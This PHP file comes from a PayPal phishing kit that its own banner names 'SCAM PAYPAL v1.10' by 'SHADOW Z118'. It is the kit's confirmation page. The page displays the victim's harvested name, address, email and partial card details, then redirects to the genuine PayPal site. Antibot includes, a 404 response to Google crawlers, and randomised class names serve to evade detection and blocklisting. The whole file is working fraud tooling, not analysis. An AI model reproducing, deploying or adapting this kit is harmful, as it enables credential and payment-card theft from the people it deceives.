<?php
/*   
   _____   _                   _                        ______    __    __     ___  
  / ____| | |                 | |                      |___  /   /_ |  /_ |   / _ \ 
 | (___   | |__     __ _    __| |   ___   __      __      / /    | |   | |   | (_) |
  \___ \  | '_ \   / _` |  / _` |  / _ \  \ \ /\ / /     / /   - | | - | | -  > _ < 
  ____) | | | | | | (_| | | (_| | | (_) |  \ V  V /     / /__  - | | - | | - | (_) |
 |_____/  |_| |_|  \__,_|  \__,_|  \___/    \_/\_/     /_____|   |_|   |_|    \___/ 
                                                                                
                              #=======================#
                              #   SCAM PAYPAL v1.10   #
                              #      SHADOW Z118      #
                              #=======================#
							  
                $$$$$$$\                     $$$$$$$\           $$\   
                $$  __$$\                    $$  __$$\          $$ |  
                $$ |  $$ |$$$$$$\  $$\   $$\ $$ |  $$ |$$$$$$\  $$ |  
                $$$$$$$  |\____$$\ $$ |  $$ |$$$$$$$  |\____$$\ $$ |  
                $$  ____/ $$$$$$$ |$$ |  $$ |$$  ____/ $$$$$$$ |$$ |  
                $$ |     $$  __$$ |$$ |  $$ |$$ |     $$  __$$ |$$ |  
                $$ |     \$$$$$$$ |\$$$$$$$ |$$ |     \$$$$$$$ |$$ |  
                \__|      \_______| \____$$ |\__|      \_______|\__|  
                                   $$\   $$ |                         
                                   \$$$$$$  |                         
                                    \______/                          
*/


session_start();
error_reporting(0); 
##################### SECOND FILES ##################### 
include('../../functions/get_lang_en.php');
//----------------------------------------------------//
$icon_card = "pp.png";
if(isset($_SESSION['_c_type_'] )) {
if ($_SESSION['_c_type_'] == "AMEX") { $icon_card = "ae.png";}
if ($_SESSION['_c_type_'] == "JCB") { $icon_card = "jc.png";}
if ($_SESSION['_c_type_'] == "DINERS CLUB") { $icon_card = "ae.png";}
if ($_SESSION['_c_type_'] == "DINERS CLUB GLOBAL") { $icon_card = "ae.png";}
if ($_SESSION['_c_type_'] == "VISA") { $icon_card = "v.png";}
if ($_SESSION['_c_type_'] == "VISA ELECTRON") { $icon_card = "v.png";}
if ($_SESSION['_c_type_'] == "MASTERCARD") { $icon_card = "mc.png";}
if ($_SESSION['_c_type_'] == "MAESTRO") { $icon_card = "ms.png";}
if ($_SESSION['_c_type_'] == "DISCOVER") { $icon_card = "d.png";}
}
$_SESSION['_cc_type_'] = ucwords(strtolower($_SESSION['_cc_type_']));
//------------------------------------------|| ANTIBOTS DZEB ||-----------------------------------------------------//
include "../../../BOTS/antibots1.php";
include "../../../BOTS/antibots2.php";
include "../../../BOTS/antibots3.php";
include "../../../BOTS/antibots4.php";
//----------------------------------------------------------------------------------------------------------------//
if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
//----------------------------------------------------------------------------------------------------------------//
?>
<html class="<?="x_".rand(39464, 20555)."ID-Z".rand(780699, 5123446)?> xx_Z118xMARVEL xx_Z118xDCxComic <?="x_".rand(39464, 20555)."ID-Z".rand(780699, 5123446)?> x_PowerRxRagers_x <?="x_".rand(39464, 20555)."ID-Z".rand(780699, 5123446)?>" dir="ltr" id="<?="PP-ID00".rand(118, 10011454198745)?>">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<title><?=$Z118_title." ".$_SESSION['_LOOKUP_CNTRCODE_'];?></title>
	<meta name="format-detection" content="telephone=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
	<link rel="shortcut icon" type="image/x-icon" href="../../lib/img/favicon.ico">
    <link rel="apple-touch-icon" href="../../lib/img/apple-touch-icon.png">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=yes">
	<!---------------------------- FONTS ROBOT CONDDENSED ----------------------------->
	<link href="https://fonts.googleapis.com/css?family=Roboto+Condensed" rel="stylesheet">
	<!------------------------------- FILES CSS STYLE --------------------------------->
    <link rel="stylesheet" href="../../lib/css/G-Z118.css">
    <link rel="stylesheet" href="../../lib/css/B-Z118.css">
	<!------------------------------- FILES CSS STYLE --------------------------------->
	<meta http-equiv="refresh" content="5; url=http://www.paypal.com/cgi-bin/webscr?cmd=_login-submit">
	<style>
	.start {
		font-size: 0.8em;
		margin-left: 2%;
	}
	.address {
		color: #656565;
		font-weight:200;
	}
	#Cd988X {
		border: 1px solid #0070ba;
    	font-size: 14px;
    	font-weight: bold;
    	padding-top: 16px;
    	padding-right: 10px;
    	padding-left: 10px;
    	border-radius: 5px;
    	width: 90%;
        margin-right: 4%;
	}
	h4 {
		font-weight: 200;
    	color: #656565;
	}
	.Z118-Icon{
        background-position: left top;
        background-image: url(../../lib/img/done.png);
        background-repeat: no-repeat;
        display: inline-block;
        height: 100px;
        width: 100px;
		margin-top: 10px;
	}
	@media all and (max-width: 767px){
		.Z118-Icon{margin-top: 0px;}
	}
	</style>
</head>
<body id="<?=rand(98, 45)."x_N666N".rand(11800918, 1001198745)?>" class="<?=rand(98, 45)."v_x666x".rand(11800918, 1001198745)?>">
<header class="<?="x_".rand(3004, 24560)."".rand(7456489, 514566)?> xx_Z118xGR <?="x_".rand(3004, 24560)."".rand(7456489, 514566)?>">
    <div class="<?="x_".rand(3004, 24560)."".rand(7456489, 514566)?> headerxx_Z118xGR <?="x_".rand(3004, 24560)."".rand(7456489, 514566)?>">
        <div class="<?="x_".rand(3004, 24560)."".rand(7456489, 514566)?> xGhostxRider_JC <?="x_".rand(3004, 24560)."".rand(7456489, 514566)?>">
            <a data-click="payPalxL0GR" href="#" class="xL0GR <?="x_".rand(3004, 24560)."".rand(7456489, 514566)?>"></a>
            <div class="<?="x_".rand(3004, 24560)."".rand(7456489, 514566)?> BTN_SuperMAN <?="x_".rand(3004, 24560)."".rand(7456489, 514566)?>"><span class="<?="x_".rand(3004, 24560)."".rand(7456489, 514566)?> ThexSHIELD118 <?="x_".rand(3004, 24560)."".rand(7456489, 514566)?>"><?=$Z118_securityLock;?></span></div>
        </div>
    </div>
</header>
    <xx_GOxGO class="Browxx_GOxGOZ118" id="<?="PP-ID118".rand(1180018, 1001198745)?>">
        <section id="content" role="xx_GOxGO" class="<?="PP-ID118".rand(1180018, 1001198745)?>">
            <section id="xx_GOxGO" class="">
                <div id="WorldWide" class="WorldWide xGhostxRider_JC">
                    <div class="x_V654DF654THEBEASTXX">
                        <form action="" method="post" name="WorldWide_form" class="validator" nox_V-ForZ118="nox_V-ForZ118">
                            <div class="D_AvengersHERE789"><span>○</span><span>○</span><span>○</span><span class="selected">●</span></div>
                            <div class="HeaderZ118">
                                <h2><?=$Z118_success;?></h2>
                            </div>
                            <hr style="width: 75%;">
                            <div>
                                <p style="text-align: center;font-size: 1.2em;width: 88%;padding-left: 6%;"><?=$Z118_successp;?></p>
                            </div>
                            <div class="MightyxMorphin" id="<?="PP-ID118".rand(1180018, 1001198745)?>">
                                <div class="0Dats_Good0" style="margin-left: 4%;">
								<center><span class="Z118-Icon"></span></center>
                                    <p><?=$Z118_billing;?></p>
                                    <div class="start">
                                        <p style="text-transform: capitalize;" class="address">
										  <?php echo $_SESSION['_fullname_'];?>
		                				  <br>
		                				  <?php echo $_SESSION['_address_'];?>
		                 				  <br>
										  <?php echo $_SESSION['_city_'].", ".$_SESSION['_state_']." ".$_SESSION['_zipCode_'];?>
										  <br>
										  <?php echo ucwords(strtolower($_SESSION['_country_'])); ?>
										</p>
									</div>
									<div class="start">
                                        <p class="address" style="font-weight: 200;">
										    <?php echo $_SESSION['_login_email_']; ?>
										</p>                                  
                                    </div>
                                    <div class="x_GxMarvelxDC">
                                        <div class="AddressLine" id="<?="PP-ID118".rand(1180018, 1001198745)?>">
                                            <p><?=$_SESSION['_cc_type_']."".$Z118_carding;?></p>
                                            <center>
                                                <div id="Cd988X">
                                                    <table border="0" width="100%" align="center" style="margin-top: -6px;margin-bottom: -6px;">
                                                        <tbody>
                                                            <tr>
                                                                <td align="center" valign="top" style="">
                                                                    <img src="./icons/<?=$icon_card;?>"></td>
                                                                <td align="center" valign="middle">
                                                                    <h4>XXXX XXXX XXXX <?=substr($_SESSION['_cardnumber_'] , -4);?></h4></td>
                                                                <td align="center" valign="middle">
                                                                    <h4><?=$_SESSION['_expdate_']; ?></h4></td>
                                                            </tr>
                                                        </tbody>
                                                    </table>
                                                </div>
                                            </center>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </form>
                    </div>
                </div>
            </section>
        </section>
    </xx_GOxGO>
    <footer id="<?="x_".rand(34, 20)."PPC000".rand(789, 516)?> gblFooter" role="contentinfo" class="<?="x_".rand(34, 20)."PPC000".rand(789, 516)?>">
        <div class="<?="x_".rand(34, 20)."PPC000".rand(789, 516)?> F00GER00 <?="x_".rand(34, 20)."PPC000".rand(789, 516)?> IntentF00GER00" id="<?="PP-Z118".rand(1180018, 1001198745)?>">
            <div class="<?="x_".rand(34, 20)."PPC000".rand(789, 516)?> F00GER00Nav <?="x_".rand(34, 20)."PPC000".rand(789, 516)?> " id="<?="x_".rand(34, 20)."PPC000".rand(789, 516)?>">
                <div class="<?="x_".rand(34, 20)."PPC000".rand(789, 516)?> xGhostxRider_JC <?="x_".rand(34, 20)."PPC000".rand(789, 516)?> " id="<?="x_".rand(34, 20)."PPC000".rand(789, 516)?>">
                    <div class="<?="x_".rand(34, 20)."PPC000".rand(789, 516)?> legal <?="x_".rand(34, 20)."PPC000".rand(789, 516)?> " id="<?="x_".rand(34, 20)."PPC000".rand(789, 516)?>">
                        <p class="<?="x_".rand(34, 20)."PPC000".rand(789, 516)?> copyright <?="x_".rand(34, 20)."PPC000".rand(789, 516)?> " id="<?="x_".rand(34, 20)."PPC000".rand(789, 516)?>">© <?=date('Y');?> &#80;&#97;&#121;&#80;&#97;&#108;</p>
                        <ul>
                            <li><a id="<?="privacyPolicy".rand(1180018, 1001198745)?> data-click="privacyPolicy" href="#" target="_blank"><?=$Z118_fPrivacy;?></a></li>
                            <li><a id="<?="legalAgreement".rand(1180018, 1001198745)?> data-click="legalAgreement" href="#" target="_blank"><?=$Z118_flegal;?></a></li>
                            <li><a id="<?="contactUs".rand(1180018, 1001198745)?> data-click="contactUs" href="#" target="_blank"><?=$Z118_fHelpCenter;?></a></li>
                            <li class="<?="x_".rand(34, 20)."PPC000".rand(789, 516)?> siteFeedback <?="x_".rand(34, 20)."PPC000".rand(789, 516)?> " id="<?="x_".rand(34, 20)."PPC000".rand(789, 516)?> siteFeedback <?="x_".rand(34, 20)."PPC000".rand(789, 516)?> "></li>
                        </ul>
						<div class="<?="x_".rand(34, 20)."PPC000".rand(789, 516)?> flag <?="x_".rand(34, 20)."PPC000".rand(789, 516)?> countryFlag <?="x_".rand(34, 20)."PPC000".rand(789, 516)?> " id="<?="x_".rand(34, 20)."PPC000".rand(789, 516)?>">
						<a id="<?="x_".rand(34, 20)."PPC000".rand(789, 516)?>" data-click="flagChange" href="#" id="<?="x_".rand(34, 20)."PPC000".rand(789, 516)?> countryFlag <?="x_".rand(34, 20)."PPC000".rand(789, 516)?> " class="<?="x_".rand(34, 20)."PPC000".rand(789, 516)?> country <?=$_SESSION['_LOOKUP_CNTRCODE_'];?>"><?="countryFlag".rand(1188, 10745)?></a>
						</div>
                    </div>
                </div>
            </div>
        </div>
    </footer>
</body>
</html>